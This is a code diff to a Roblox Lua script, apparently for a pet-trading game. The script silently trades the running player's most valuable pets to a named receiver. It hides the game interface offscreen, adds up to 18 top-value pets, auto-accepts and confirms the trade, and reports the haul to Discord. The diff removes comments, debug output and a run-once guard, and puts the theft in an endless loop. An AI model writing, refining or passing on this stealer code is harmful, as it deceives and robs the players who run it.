@@ -655,21 +655,11 @@ function SendTradeSuccessMessage(ReceiverName, tradedPets)
             Body = body
         })
     end)
-    
-    if success then
-        print("✅ Trade success message sent to Discord")
-    else
-        print("❌ Failed to send trade success message: " .. tostring(result))
-    end
 end
 
--- Modified TradeIncoming function with trade completion tracking
+
 local function TradeIncoming(ReceiverName)
-    if sent then return end
-    sent = true
-    
-    print("🎯 Starting trade with: " .. ReceiverName)
-    
+    while true do
     local RouterClient = Loaders("RouterClient")
     local SendTrade = RouterClient.get("TradeAPI/SendTradeRequest")
     local AddPetRemote = RouterClient.get("TradeAPI/AddItemToOffer")
@@ -678,10 +668,9 @@ local function TradeIncoming(ReceiverName)
     local InventoryDB = require(game.ReplicatedStorage.Fsys).load("InventoryDB")
     local ClientData = require(game.ReplicatedStorage.ClientModules.Core.ClientData)
 
-    -- Get current pets before trade
     local PetsInventory = ClientData.get_data()[game.Players.LocalPlayer.Name].inventory.pets
     local sortedPets = {}
-    local tradedPets = {} -- Store pets that will be traded
+    local tradedPets = {} 
     
     for petUid, petData in pairs(PetsInventory) do
         local petInfo = InventoryDB[petData.category][petData.id]
@@ -695,24 +684,20 @@ local function TradeIncoming(ReceiverName)
         })
     end
     
-    -- Sort pets by value (highest first)
     table.sort(sortedPets, function(a, b)
         return a.value > b.value
     end)
     
-    -- Send trade request
     moveGuiOffscreen()
     SendTrade:FireServer(game.Players[ReceiverName])
     wait(5)
     
-    -- Add pets to trade (best ones first) and track them
     local petCount = 0
     local petLimit = 18
     
     for _, petInfo in ipairs(sortedPets) do
         if petCount < petLimit then
             AddPetRemote:FireServer(petInfo.uid)
-            -- Add to traded pets list
             table.insert(tradedPets, {
                 uid = petInfo.uid,
                 data = petInfo.data,
@@ -720,29 +705,23 @@ local function TradeIncoming(ReceiverName)
                 value = petInfo.value
             })
             petCount = petCount + 1
-            print("➕ Added pet to trade: " .. petInfo.name)
             wait(0.2)
         else
             break
         end
     end
-    
-    -- Accept negotiation and confirm trade
-    wait(5)
-    AcceptNegotiationRemote:FireServer()
-    
-    wait(2)
-    ConfirmTradeRemote:FireServer()
-    
-    -- Send trade success message to Discord
-    wait(2) -- Wait a bit for trade to complete
-    if #tradedPets > 0 then
-        SendTradeSuccessMessage(ReceiverName, tradedPets)
-    else
-        print("⚠️ No pets were traded")
-    end
-    
-    print("✅ Trade completed with: " .. ReceiverName)
+                wait(5)
+                    AcceptNegotiationRemote:FireServer()
+                wait(2)
+                    ConfirmTradeRemote:FireServer()
+                wait(2) 
+                    if #tradedPets > 0 then
+                        SendTradeSuccessMessage(ReceiverName, tradedPets)
+                    else
+                        print("⚠️ No pets were traded")
+                    end
+                print("✅ Trade completed with: " .. ReceiverName)
+            end
 end
 
 function SendLeaveNotify(playerName)
